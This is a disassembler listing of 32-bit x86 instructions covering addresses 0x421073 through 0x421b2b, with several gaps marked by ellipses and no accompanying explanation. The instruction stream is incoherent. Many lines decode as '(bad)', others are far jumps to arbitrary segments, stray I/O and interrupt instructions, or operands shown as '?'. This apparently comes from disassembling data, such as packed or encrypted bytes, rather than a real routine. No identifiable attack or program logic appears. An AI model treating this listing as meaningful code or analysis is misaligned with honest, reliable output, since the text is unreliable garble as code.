  421073:	not    BYTE PTR [edi+0x1e1e2b9b]
  421079:	int    0xa6
  42107b:	sahf   
  42107c:	jbe    0x421057
  42107e:	ficom  DWORD PTR [edx+edx*8-0xf]
  421082:	pop    ss
  421083:	adc    al,0xd4
  421085:	jns    0x4210ab
  421087:	mov    cl,0x74
  421089:	mov    edx,DWORD PTR [ebx]
  42108b:	cld    
  42108c:	jno    0x42104f
  42108e:	rcl    DWORD PTR [eax],1
  421090:	cmp    esp,DWORD PTR [edx+0x66785a64]
  421096:	fidiv  DWORD PTR [edx+0x8d299f6]
  42109c:	shl    DWORD PTR [ebp+0x62],1
  42109f:	xchg   edx,eax
  4210a0:	sub    eax,0x2425dcde
  4210a5:	jbe    0x421027
  4210a7:	add    al,0x45
  4210a9:	xchg   ebx,eax
  4210aa:	sbb    al,dh
  4210ac:	mov    al,ds:0x7542a41f
  4210b1:	push   ss
  4210b2:	push   es
  4210b3:	xor    al,0xb6
  4210b5:	sar    bh,1
  4210b7:	outs   dx,BYTE PTR ds:[esi]
  4210b8:	xchg   ecx,eax
  4210b9:	ins    WORD PTR es:[edi],dx
  4210bb:	sbb    al,0xfe
  4210bd:	rol    DWORD PTR [esp+eiz*2-0x26],0x0
	...
  421132:	add    BYTE PTR [eax],al
  421134:	jae    0x421105
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x421196
  421141:	cmp    BYTE PTR [ecx+0x73],0xf6
  421145:	popa   
  421146:	add    DWORD PTR [eax],eax
  421148:	cmc    
  421149:	add    BYTE PTR [eax],al
  42114b:	add    BYTE PTR [ebx-0x24dbedf6],dl
  421151:	xor    eax,0x1a09aad2
  421156:	mov    ah,0x3a
  421158:	adc    BYTE PTR [ebx],0x2d
  42115b:	test   esi,edx
  42115d:	aam    0x7d
  42115f:	push   0x1d5cff4d
  421164:	lods   eax,DWORD PTR ds:[esi]
  421165:	pop    es
  421166:	jno    0x421174
  421168:	jmp    0x3b04:0x32173d4b
  42116f:	dec    ebx
  421170:	enter  0xd7ac,0x83
  421174:	push   edx
  421175:	pop    edx
  421176:	pusha  
  421177:	fldcw  WORD PTR [ebx-0x7f46637d]
  42117d:	inc    ebx
  42117e:	shl    DWORD PTR [edi-0x72],1
  421181:	mov    al,0xef
  421183:	fisub  DWORD PTR [eax-0x54]
  421186:	or     DWORD PTR [ebp-0x1d222bd3],esi
  42118c:	stos   BYTE PTR es:[edi],al
  42118d:	mov    eax,0x47c9b6d5
  421192:	fst    DWORD PTR [ebx+0x36]
  421195:	mov    edx,0x20db0fed
  42119a:	mov    es,WORD PTR ds:0x89590371
  4211a0:	adc    esi,ecx
  4211a2:	add    al,0x45
  4211a4:	or     DWORD PTR [esi+0x5ffc2779],eax
  4211aa:	fild   QWORD PTR [esi+0x2ff18429]
  4211b0:	push   ecx
  4211b1:	aaa    
  4211b2:	std    
  4211b3:	xchg   edi,eax
  4211b4:	jecxz  0x421228
  4211b6:	push   ebp
  4211b7:	jns    0x42116e
  4211b9:	jo     0x421153
  4211bb:	pop    DWORD PTR [ecx+ebx*4+0x2cde492d]
  4211c2:	jmp    0x32fb:0xe2eb6727
  4211c9:	pop    ss
  4211ca:	(bad)  
  4211cb:	loopne 0x4211ca
  4211cd:	add    ch,BYTE PTR [ebx-0x21b26052]
  4211d3:	ins    DWORD PTR es:[edi],dx
  4211d4:	or     eax,0x9033aa08
  4211d9:	daa    
  4211da:	aad    0x1
  4211dc:	aam    0x6d
  4211de:	js     0x4211c7
  4211e0:	int    0xeb
  4211e2:	dec    ecx
  4211e3:	xor    ebx,DWORD PTR [ebx+0x4c]
  4211e6:	cmp    dl,BYTE PTR [ebx-0x3c]
  4211e9:	arpl   WORD PTR [ebp+0x5dabe689],dx
  4211ef:	xchg   ecx,eax
  4211f0:	or     ah,BYTE PTR [edi-0x11]
  4211f3:	dec    ecx
  4211f4:	jl     0x4211e9
  4211f6:	mov    edx,0xf90483f6
  4211fb:	int3   
  4211fc:	mov    ds:0x592a0c03,al
  421201:	sbb    BYTE PTR [ebx+0x9e50563],al
  421207:	push   0xd532199d
  42120c:	adc    cl,ch
  42120e:	inc    ebp
  42120f:	jl     0x421245
  421211:	xchg   ebx,eax
  421212:	imul   esp,DWORD PTR [ebx+ebp*2+0x1a61f21f],0x14f53949
  42121d:	popa   
  42121e:	jmp    DWORD PTR [ebx]
  421220:	xor    dl,BYTE PTR [ebp+0x131c9e26]
  421226:	in     al,dx
  421227:	int3   
  421228:	jo     0x421236
  42122a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42122b:	mov    ah,0xea
  42122d:	aas    
  42122e:	pop    ebx
  42122f:	cmp    eax,0xc983fea8
  421234:	dec    BYTE PTR [ebx+0x3ffd735e]
  42123a:	(bad)  
  42123b:	mov    al,0x8
  42123d:	stos   DWORD PTR es:[edi],eax
  42123e:	dec    edi
  42123f:	inc    ebx
  421240:	hlt    
	...
  4212b1:	add    BYTE PTR [eax],al
  4212b3:	add    BYTE PTR [ecx+0x6],al
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x7183dc15
  4212c1:	mov    eax,ds:0x62ebf99f
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	cmc    
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    BYTE PTR [edx+0x69c167e6],cl
  4212d1:	or     eax,0x16542f39
  4212d6:	adc    al,ch
  4212d8:	xor    ebp,edx
  4212da:	fld    TBYTE PTR [ecx+0x3e36019]
  4212e0:	inc    esi
  4212e1:	sub    dl,0x75
  4212e4:	adc    dl,bh
  4212e6:	xchg   ch,ch
  4212e8:	cs jl  0x42129a
  4212eb:	(bad)  
  4212ec:	imul   ecx,DWORD PTR ds:0x4dcc4ffa,0xf205e62c
  4212f6:	cmp    al,0x9c
  4212f8:	jbe    0x421365
  4212fa:	mov    eax,0xdc47885c
  4212ff:	int3   
  421300:	scas   al,BYTE PTR es:[edi]
  421301:	bnd jae 0x421322
  421304:	lock test ch,dl
  421307:	jnp    0x42131a
  421309:	cmp    al,0x38
  42130b:	clc    
  42130c:	pop    edi
  42130d:	sbb    al,0xc3
  42130f:	in     al,dx
  421310:	retf   
  421311:	add    al,0x3f
  421313:	hlt    
  421314:	and    BYTE PTR [esi-0x7a],al
  421317:	das    
  421318:	jno    0x421338
  42131a:	sbb    BYTE PTR [edi-0x3d8d1d99],bh
  421320:	xlat   BYTE PTR ds:[ebx]
  421321:	aaa    
  421322:	lds    ecx,FWORD PTR [eax-0x77]
  421325:	sub    esi,DWORD PTR [edx]
  421327:	dec    esi
  421328:	popa   
  421329:	add    esi,edx
  42132b:	push   ebp
  42132c:	retf   
  42132d:	enter  0x1c16,0x1f
  421331:	inc    esp
  421332:	cmp    ecx,DWORD PTR [ecx]
  421334:	sub    DWORD PTR [esi+0x246f0155],esp
  42133a:	out    0x69,al
  42133c:	mov    esp,0x1426f1a
  421341:	sub    BYTE PTR [esi+esi*8-0x7b2099cc],cl
  421348:	xlat   BYTE PTR ds:[ebx]
  421349:	ja     0x421352
  42134b:	sti    
  42134c:	daa    
  42134d:	xor    dl,BYTE PTR [ebx+0x3d04d494]
  421353:	outs   dx,DWORD PTR ds:[esi]
  421354:	xchg   BYTE PTR [eax-0x51889e78],ah
  42135a:	daa    
  42135b:	mov    ds:0xe2cb7d23,al
  421360:	iret   
  421361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421362:	dec    edi
  421363:	pop    ecx
  421364:	gs call 0x47be8818
  42136a:	push   ds
  42136b:	jp     0x4213d2
  42136d:	das    
  42136e:	and    al,0x1e
  421370:	fs popf 
  421372:	sub    esi,DWORD PTR [ecx+0x71]
  421375:	or     ch,dl
  421377:	push   esi
  421378:	push   ds
  421379:	das    
  42137a:	(bad)  
  42137c:	sti    
  42137d:	add    al,0xd4
  42137f:	hlt    
  421380:	gs (bad) 
  421382:	mov    al,0x75
  421384:	cli    
  421385:	sbb    edx,DWORD PTR [esi]
  421387:	sub    DWORD PTR [ebx+ebp*1],esi
  42138a:	(bad)  
  42138b:	sub    DWORD PTR [ecx],edi
  42138d:	test   esp,eax
  42138f:	cmp    DWORD PTR [eax+0x377958d9],esp
  421395:	test   al,0xb6
  421397:	and    eax,0xe5f31614
  42139c:	in     al,dx
  42139d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42139e:	mov    al,0xd9
  4213a0:	icebp  
  4213a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a2:	lea    ebp,[edx+0x3a]
  4213a5:	pop    edi
  4213a6:	out    dx,al
  4213a7:	test   al,0x77
  4213a9:	outs   dx,BYTE PTR ds:[esi]
  4213aa:	or     eax,0xa4087f46
  4213af:	mov    cl,0x73
  4213b1:	adc    al,0x9c
  4213b3:	push   esi
  4213b4:	ret    
  4213b5:	daa    
  4213b6:	sub    eax,0x1b982863
  4213bb:	jno    0x4213d2
  4213bd:	mov    WORD PTR [eax-0x75],ss
  4213c0:	fiadd  DWORD PTR [eax]
	...
  421432:	add    BYTE PTR [eax],al
  421434:	scas   al,BYTE PTR es:[edi]
  421435:	xchg   esp,eax
  421436:	push   edi
  421437:	adc    bh,BYTE PTR [edi-0x2d]
  42143a:	out    dx,eax
  42143b:	mov    esp,0x960320e2
  421440:	add    DWORD PTR [eax+eax*2-0x50],esi
  421444:	loopne 0x4214a9
  421446:	add    DWORD PTR [eax],eax
  421448:	cmc    
  421449:	add    BYTE PTR [eax],al
  42144b:	add    dl,bl
  42144d:	arpl   WORD PTR [ebx+0x48],bx
  421450:	pop    edi
  421451:	rol    BYTE PTR [edx],1
  421453:	mov    ebx,0x9bb23f10
  421458:	in     al,dx
  421459:	aam    0x8e
  42145b:	popa   
  42145c:	aad    0xfd
  42145e:	and    al,0xd4
  421460:	jns    0x42149f
  421462:	mov    bh,0xa2
  421464:	pop    eax
  421465:	fcom   DWORD PTR [ebx]
  421467:	aam    0x12
  421469:	and    al,BYTE PTR [eax+0x76]
  42146c:	call   0x1955:0xf71dcdc6
  421473:	xchg   edi,eax
  421474:	sub    dl,BYTE PTR [ebx-0x76]
  421477:	fdivr  DWORD PTR [eax]
  421479:	mov    bh,0xdb
  42147b:	add    ecx,DWORD PTR [ecx-0x26b2b222]
  421481:	lds    ecx,FWORD PTR [esp+ecx*8+0x21]
  421485:	xor    DWORD PTR [ecx+0x52],ebp
  421488:	test   BYTE PTR [esi+eax*4],ch
  42148b:	jnp    0x42146e
  42148d:	inc    esp
  42148e:	and    DWORD PTR [eax+0x3c],edx
  421491:	stos   BYTE PTR es:[edi],al
  421492:	aas    
  421493:	shr    DWORD PTR ds:0xfe4de763,0x2d
  42149a:	outs   dx,DWORD PTR ds:[esi]
  42149b:	iret   
  42149c:	das    
  42149d:	pop    eax
  42149e:	dec    edi
  42149f:	(bad)  
  4214a0:	push   ds
  4214a1:	mov    al,0xda
  4214a3:	dec    ecx
  4214a4:	test   al,0x1c
  4214a6:	push   ecx
  4214a7:	cs jg  0x4214e4
  4214aa:	pop    ebx
  4214ab:	mov    ah,0x9e
  4214ad:	aam    0x6d
  4214af:	loop   0x4214a1
  4214b1:	cdq    
  4214b2:	fadd   st(0),st
  4214b4:	in     al,dx
  4214b5:	mov    BYTE PTR [eax-0x4e0369ba],cl
  4214bb:	not    BYTE PTR [ebx]
  4214bd:	mov    edi,0x83aa2564
  4214c2:	mov    ah,0x52
  4214c4:	(bad)  
  4214c5:	xchg   ebp,eax
  4214c6:	int    0x44
  4214c8:	sub    al,BYTE PTR [eax]
  4214ca:	mov    ds:0xe3a98e9d,eax
  4214cf:	push   esp
  4214d0:	nop
  4214d1:	dec    ebx
  4214d2:	loope  0x4214c2
  4214d4:	imul   ecx,DWORD PTR [ecx+ecx*4+0x296b1115],0x5b
  4214dc:	js     0x42154e
  4214de:	test   eax,0x363d0f74
  4214e3:	inc    esp
  4214e4:	imul   eax,esi,0x2c
  4214e7:	imul   esi,DWORD PTR [edx],0xffffffde
  4214ea:	test   DWORD PTR [esi-0x2b],ebx
  4214ed:	scas   al,BYTE PTR es:[edi]
  4214ee:	jns    0x421512
  4214f0:	(bad)  
  4214f1:	sbb    eax,0x7bffd1fa
  4214f6:	into   
  4214f7:	cmp    BYTE PTR [eax-0x50745a16],al
  4214fd:	push   ebx
  4214fe:	dec    esi
  4214ff:	pushf  
  421500:	cdq    
  421501:	xchg   esp,eax
  421502:	jmp    0xc0235151
  421507:	inc    edx
  421508:	(bad)  [ecx-0x3b29ab93]
  42150e:	ins    DWORD PTR es:[edi],dx
  42150f:	adc    eax,0x261e438b
  421514:	out    dx,al
  421515:	push   ss
  421516:	addr16 adc ah,cl
  421519:	mov    bh,BYTE PTR [ebx]
  42151b:	addr16 dec esi
  42151d:	xchg   esi,eax
  42151e:	daa    
  42151f:	xchg   ebp,eax
  421520:	cmp    DWORD PTR [ecx+0x1746b23a],0xb
  421527:	fist   DWORD PTR [ecx-0x17]
  42152a:	xchg   esi,eax
  42152b:	jle    0x421542
  42152d:	in     eax,0x1b
  42152f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421530:	mov    ah,0x30
  421532:	mov    cl,0x19
  421534:	ins    BYTE PTR es:[edi],dx
  421535:	xchg   esi,eax
  421536:	daa    
  421537:	loop   0x4215ad
  421539:	fdiv   DWORD PTR [edi+0x13]
  42153c:	mov    eax,ds:0x6b08b78e
	...
  4215b1:	add    BYTE PTR [eax],al
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	mov    ah,ah
  4215c2:	iret   
  4215c3:	sub    edx,ebp
  4215c5:	add    DWORD PTR fs:[eax],eax
  4215c8:	cmc    
  4215c9:	add    BYTE PTR [eax],al
  4215cb:	add    BYTE PTR [ebx-0x5b],dl
  4215ce:	or     eax,ebx
  4215d0:	fdivr  QWORD PTR [ecx-0x79]
  4215d3:	pop    edi
  4215d4:	not    esp
  4215d6:	lock sbb bh,BYTE PTR [edi]
  4215d9:	xor    DWORD PTR [edx-0x3a],ebx
  4215dc:	push   ebx
  4215dd:	es xchg ebx,eax
  4215df:	in     eax,dx
  4215e0:	mov    BYTE PTR [edi-0x2d383b66],cl
  4215e6:	out    0xb3,al
  4215e8:	rcr    DWORD PTR [ebp+0x37cc7877],0xdb
  4215ef:	stc    
  4215f0:	(bad)  
  4215f1:	shl    DWORD PTR [ecx-0x70e35ce8],1
  4215f7:	sub    al,0x9a
  4215f9:	push   ds
  4215fa:	sti    
  4215fb:	push   esi
  4215fc:	test   ah,dl
  4215fe:	and    ebp,ebp
  421600:	mov    ebx,0x214fbaa2
  421605:	jns    0x4215bb
  421607:	dec    eax
  421608:	ds mov ecx,ebx
  42160b:	inc    eax
  42160c:	and    DWORD PTR ds:0x5fa5c607,esp
  421612:	cmp    ah,BYTE PTR [ebx]
  421614:	fwait
  421615:	mov    edi,0xd0a81794
  42161a:	ins    DWORD PTR es:[edi],dx
  42161b:	(bad)  [ebx-0xe8552b]
  421621:	loope  0x4215e1
  421623:	and    ebx,DWORD PTR [edi]
  421625:	js     0x421653
  421627:	pop    eax
  421628:	xchg   esp,eax
  421629:	sub    al,ch
  42162b:	mov    cl,BYTE PTR [eax+0x2a]
  42162e:	xadd   DWORD PTR [esp+eax*4+0x1d3988b1],esi
  421636:	and    edi,esi
  421638:	mov    al,ds:0x7ea21a3e
  42163d:	jnp    0x421664
  42163f:	add    DWORD PTR [ebx-0x24],esi
  421642:	(bad)  
  421643:	sbb    eax,0xeae1a271
  421648:	xchg   edi,eax
  421649:	aad    0x49
  42164b:	aas    
  42164c:	push   0xfffffff2
  42164e:	adc    dl,BYTE PTR [esi]
  421650:	clc    
  421651:	xchg   edi,eax
  421652:	and    al,0xbf
  421654:	pop    ebx
  421655:	shl    cl,cl
  421657:	imul   eax,eax,0x8fc8ea5d
  42165d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42165e:	aam    0x5f
  421660:	push   ebp
  421661:	out    dx,al
  421662:	addr16 pop ecx
  421664:	addr16 lahf 
  421666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421667:	push   0xc073f5c
  42166c:	lds    eax,FWORD PTR [esi-0x5e]
  42166f:	add    edi,DWORD PTR [edi-0x20f3702d]
  421675:	jb     0x421687
  421677:	fsub   QWORD PTR [eax-0x78]
  42167a:	test   BYTE PTR [esi+ecx*4-0x73],dl
  42167e:	test   DWORD PTR [eax],ebp
  421680:	or     al,0x9f
  421682:	or     BYTE PTR es:[ecx-0x3a],ah
  421686:	adc    ecx,DWORD PTR [esi+0x5a]
  421689:	xor    eax,0x1c46355a
  42168e:	inc    esi
  42168f:	(bad)  
  421690:	loop   0x421694
  421692:	lods   al,BYTE PTR ds:[esi]
  421693:	jns    0x4216ae
  421695:	lea    eax,ss:[edi-0x3a062c3d]
  42169c:	ffree  st(4)
  42169e:	inc    edx
  42169f:	jg     0x42162d
  4216a1:	cmp    BYTE PTR [edi],bh
  4216a3:	aam    0xac
  4216a5:	xor    al,BYTE PTR [esi+0x47]
  4216a8:	sbb    eax,0x3e01db45
  4216ad:	nop
  4216ae:	jge    0x4216ac
  4216b0:	stos   BYTE PTR es:[edi],al
  4216b1:	lods   al,BYTE PTR cs:[esi]
  4216b3:	hlt    
  4216b4:	cmp    edi,ecx
  4216b6:	push   cs
  4216b7:	in     eax,0xaa
  4216b9:	sti    
  4216ba:	outs   dx,BYTE PTR ds:[esi]
  4216bb:	lods   al,BYTE PTR ds:[esi]
  4216bc:	xchg   edx,eax
  4216bd:	adc    eax,0xbdc0bb
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    esi,DWORD PTR [esi-0xa]
  421742:	inc    ebx
  421743:	imul   ecx,edx,0xf5000165
  421749:	add    BYTE PTR [eax],al
  42174b:	add    dl,ah
  42174d:	adc    BYTE PTR [esi+eiz*2-0x67],ch
  421751:	(bad)  
  421752:	in     eax,dx
  421753:	pop    ds
  421754:	enter  0x38e2,0xd9
  421758:	xchg   edi,eax
  421759:	popf   
  42175a:	mov    esp,0xbbe0ef8
  42175f:	and    DWORD PTR [edx],0xa01d3ea9
  421765:	mov    esi,0x53dec9
  42176a:	outs   dx,BYTE PTR ds:[esi]
  42176b:	and    ebp,DWORD PTR [ebp-0x769115c]
  421771:	(bad)  
  421772:	mov    cl,0x5e
  421774:	push   ecx
  421775:	cmp    eax,0xcfa02ce4
  42177a:	or     eax,0x2ce45a53
  42177f:	fisubr WORD PTR [eax+ebx*8-0x2c]
  421783:	xchg   ecx,eax
  421784:	(bad)  
  421785:	xchg   ebx,eax
  421786:	jp     0x421725
  421788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421789:	adc    BYTE PTR [eax+ebp*2+0x35bdb319],ah
  421790:	aam    0xf7
  421792:	xchg   edi,eax
  421793:	cmp    al,0xa1
  421795:	adc    DWORD PTR [ecx],0x9137b90c
  42179b:	mov    cs,WORD PTR [ebp-0x77030ac9]
  4217a1:	jecxz  0x4217da
  4217a3:	inc    edx
  4217a4:	mov    esi,0x90379116
  4217a9:	test   BYTE PTR [ecx+0x3e0123a],ah
  4217af:	push   edx
  4217b0:	sub    al,0x78
  4217b2:	ins    DWORD PTR es:[edi],dx
  4217b3:	cmp    eax,0x254440be
  4217b8:	push   ss
  4217b9:	les    ecx,FWORD PTR [edi]
  4217bb:	or     edx,DWORD PTR [esi]
  4217bd:	mov    ch,0x77
  4217bf:	and    eax,0x61f1ad8d
  4217c4:	or     eax,0x2809fc99
  4217c9:	push   cs
  4217ca:	jg     0x421838
  4217cc:	mov    bl,0x23
  4217ce:	xchg   esp,eax
  4217cf:	out    0x4c,eax
  4217d1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217d3:	and    DWORD PTR [esi+0x5f2caf4c],ebx
  4217d9:	cli    
  4217da:	retf   
  4217db:	mov    ecx,0xf4a4234d
  4217e0:	xlat   BYTE PTR ds:[ebx]
  4217e1:	ja     0x4217ca
  4217e3:	mov    DWORD PTR [esi+edi*8-0x49e1415b],eax
  4217ea:	mov    al,0x8f
  4217ec:	jnp    0x421814
  4217ee:	fistp  DWORD PTR [ecx-0x6d]
  4217f1:	fwait
  4217f2:	stc    
  4217f3:	retf   
  4217f4:	xor    ebp,DWORD PTR [edx+eiz*4+0x12]
  4217f8:	jge    0x42186a
  4217fa:	push   cs
  4217fb:	fimul  WORD PTR [edi-0x85be150]
  421801:	xor    eax,0x16f7eadf
  421806:	xor    DWORD PTR [eax+0x4265d9a6],eax
  42180c:	push   ds
  42180d:	push   ecx
  42180e:	adc    ecx,esp
  421810:	pop    ss
  421811:	xlat   BYTE PTR ds:[ebx]
  421812:	xchg   ebp,eax
  421813:	push   es
  421814:	add    BYTE PTR [edi-0x34],bh
  421817:	dec    ebx
  421818:	mov    dl,0xaf
  42181a:	mov    dh,0x50
  42181c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42181d:	or     eax,0xa9c3a8ae
  421822:	rol    BYTE PTR [edi+ebp*8],0x90
  421826:	addr16 pop esi
  421828:	push   0x7e
  42182a:	or     BYTE PTR [ecx-0x22],cl
  42182d:	int    0x5a
  42182f:	push   ebp
  421830:	aad    0x8c
  421832:	sbb    DWORD PTR [ebx-0x7584e74f],esp
  421838:	sbb    al,0xc4
  42183a:	into   
  42183b:	mov    dl,0xa
  42183d:	sbb    eax,0xe4aa7c
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ebp,DWORD PTR [ebp+0x17]
  4218c2:	mov    eax,ds:0x166bf79
  4218c7:	add    ch,dh
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    BYTE PTR [eax],dh
  4218cd:	out    dx,al
  4218ce:	mov    edi,0xda174500
  4218d3:	fadd   st,st(1)
  4218d5:	popf   
  4218d6:	data16 ja 0x4218d6
  4218d9:	lock dec ecx
  4218db:	cmp    bh,bl
  4218dd:	js     0x4218a7
  4218df:	in     eax,0xb5
  4218e1:	(bad)  
  4218e2:	jb     0x4218bf
  4218e4:	(bad)  
  4218e5:	adc    BYTE PTR [edx-0x3d],al
  4218e8:	ror    DWORD PTR [ebx+0x9499943],0x21
  4218ef:	fsubr  QWORD PTR [ebx]
  4218f1:	leave  
  4218f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218f3:	mov    cl,0xd
  4218f5:	push   es
  4218f6:	push   esi
  4218f7:	mov    ds:0x7103d861,al
  4218fc:	in     al,dx
  4218fd:	cmp    BYTE PTR [ebx],bh
  4218ff:	out    dx,eax
  421900:	jmp    0xaf6d8809
  421905:	xor    eax,0xb40d1010
  42190a:	inc    ecx
  42190b:	cld    
  42190c:	mov    dh,0x3d
  42190e:	inc    edx
  42190f:	mov    ds:0x96c086b9,eax
  421914:	ja     0x421928
  421916:	in     eax,0x12
  421918:	jbe    0x42191c
  42191a:	imul   edx,edx,0xffffff90
  42191d:	pop    ebp
  42191e:	es nop
  421920:	mov    ah,0xf4
  421922:	push   esi
  421923:	jae    0x42195a
  421925:	xchg   DWORD PTR [edx+0x20],ebx
  421928:	(bad)  
  421929:	into   
  42192a:	scas   al,BYTE PTR es:[edi]
  42192b:	ss stc 
  42192d:	sub    edx,ecx
  42192f:	jne    0x42193b
  421931:	fnsave [eax+0x5c]
  421934:	jb     0x42191c
  421936:	sbb    eax,0x5a5df38c
  42193b:	lds    edx,FWORD PTR [esi+0x2c591d67]
  421941:	xor    bl,0x41
  421944:	ins    BYTE PTR es:[edi],dx
  421945:	mov    dl,0x4c
  421947:	loopne 0x421913
  421949:	pop    ebp
  42194a:	les    ecx,FWORD PTR [ebp+0x52896541]
  421950:	aaa    
  421951:	mov    bl,0x3d
  421953:	je     0x4219d1
  421955:	(bad)  
  421956:	js     0x4218eb
  421958:	mov    BYTE PTR [edx-0xe],ah
  42195b:	jbe    0x421906
  42195d:	xchg   ecx,eax
  42195e:	frstor [ecx-0x65]
  421961:	xor    DWORD PTR [edi+0x6b],0x54f7df
  421968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421969:	iret   
  42196a:	and    ecx,ecx
  42196c:	mov    dh,0xe0
  42196e:	mov    dh,0xfc
  421970:	push   edx
  421971:	out    0x43,eax
  421973:	push   cs
  421974:	push   ebp
  421975:	xor    eax,0x17f2958c
  42197a:	adc    ebp,DWORD PTR [edx]
  42197c:	icebp  
  42197d:	es add eax,0x83407705
  421983:	or     dl,BYTE PTR fs:[ebx+0x6e]
  421987:	cmp    esp,DWORD PTR [edx+0x1f156460]
  42198d:	(bad)  
  42198e:	cld    
  42198f:	ror    BYTE PTR [esi],cl
  421991:	mov    ebx,0xc3e7f0f7
  421996:	xchg   edi,eax
  421997:	jmp    0xe21a:0x37b99d69
  42199e:	dec    ebp
  42199f:	pop    ds
  4219a0:	(bad)  [edi-0x6e81ff6c]
  4219a6:	sub    al,0xc
  4219a8:	cld    
  4219a9:	or     eax,0x3127c67b
  4219ae:	rcl    BYTE PTR [ecx],0xc4
  4219b1:	xor    al,0xd1
  4219b3:	inc    ebx
  4219b4:	sbb    DWORD PTR [edi-0x38bcf606],0xa9cdeab6
  4219be:	sub    eax,0x98fb
	...
  421a33:	add    bh,bl
  421a35:	xor    ch,BYTE PTR [edi-0x6010ed]
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x1ee663b4]
  421a44:	mov    ah,0x67
  421a46:	add    DWORD PTR [eax],eax
  421a48:	cmc    
  421a49:	add    BYTE PTR [eax],al
  421a4b:	add    BYTE PTR [eax],ch
  421a4d:	xor    DWORD PTR [ebp+edx*8+0x259b6d0d],edi
  421a54:	test   ch,ch
  421a56:	mov    ebp,0x50227bdc
  421a5b:	fsubr  DWORD PTR [ebx+0x14]
  421a5e:	add    eax,0x4de9152b
  421a63:	outs   dx,BYTE PTR ds:[esi]
  421a64:	mov    edx,0x605834fb
  421a69:	aaa    
  421a6a:	test   al,0xcd
  421a6c:	inc    ebp
  421a6d:	leave  
  421a6e:	scas   eax,DWORD PTR es:[edi]
  421a6f:	pop    edx
  421a70:	adc    ebx,DWORD PTR [ebp-0x59]
  421a73:	in     al,dx
  421a74:	mov    cl,0x88
  421a76:	xlat   BYTE PTR ds:[ebx]
  421a77:	xor    ah,dh
  421a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a7a:	xchg   DWORD PTR [ebp-0x390c0e23],ebp
  421a80:	retf   
  421a81:	(bad)  
  421a82:	jne    0x421ad3
  421a84:	and    BYTE PTR [ebx-0xaff62e3],al
  421a8a:	(bad)  
  421a8b:	pop    ebp
  421a8c:	arpl   WORD PTR [ebp-0x721e707f],sp
  421a92:	jmp    0x4cbc2528
  421a97:	dec    edi
  421a98:	lods   eax,DWORD PTR ds:[esi]
  421a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a9a:	mov    al,0xfb
  421a9c:	mov    gs,esi
  421a9e:	sbb    eax,DWORD PTR [edx+0x5096a1ac]
  421aa4:	pop    eax
  421aa5:	loopne 0x421ab0
  421aa7:	call   FWORD PTR [edx]
  421aa9:	cmp    bh,BYTE PTR [esi-0x3fb84295]
  421aaf:	adc    dl,ah
  421ab1:	adc    ch,al
  421ab3:	lea    esp,[ebx-0x25927d13]
  421ab9:	xor    al,0x86
  421abb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421abc:	mov    ch,0xb2
  421abe:	pop    ebx
  421abf:	stos   BYTE PTR es:[edi],al
  421ac0:	leave  
  421ac1:	(bad)  
  421ac2:	sbb    edx,ebp
  421ac4:	xor    esi,ecx
  421ac6:	stos   DWORD PTR es:[edi],eax
  421ac7:	inc    esp
  421ac8:	and    bh,cl
  421aca:	call   0xea37:0x5269d635
  421ad1:	and    BYTE PTR [ebx-0x29fd6955],0x4
  421ad8:	inc    eax
  421ad9:	pop    es
  421ada:	pushf  
  421adb:	sub    eax,0x8b69e32a
  421ae0:	jmp    0x421aef
  421ae2:	int    0xe0
  421ae4:	iret   
  421ae5:	push   ebx
  421ae6:	adc    BYTE PTR [ebx+0x21],cl
  421ae9:	sbb    DWORD PTR [edx],edi
  421aeb:	lods   al,BYTE PTR ds:[esi]
  421aec:	and    edx,DWORD PTR [ebp*4+0x6d52290c]
  421af3:	push   ebp
  421af4:	mov    WORD PTR [esi],?
  421af6:	mov    ?,WORD PTR [edx+0x30d80cb6]
  421afc:	lods   al,BYTE PTR ds:[esi]
  421afd:	loopne 0x421b31
  421aff:	aam    0x59
  421b01:	loop   0x421b0e
  421b03:	sbb    DWORD PTR [ecx*4-0xa05f4d0],edx
  421b0a:	push   edi
  421b0b:	push   esp
  421b0c:	mov    ecx,0x75fc13df
  421b11:	dec    esp
  421b12:	test   BYTE PTR [ebp-0x5e901810],ah
  421b18:	mov    al,dh
  421b1a:	jmp    0x421b67
  421b1c:	inc    esi
  421b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b1e:	inc    eax
  421b1f:	ret    0xeb6f
  421b22:	mov    eax,ds:0xd1623fc2
  421b27:	int3   
  421b28:	xlat   BYTE PTR ds:[ebx]
  421b29:	arpl   WORD PTR [esi],cx
  421b2b:	cli    
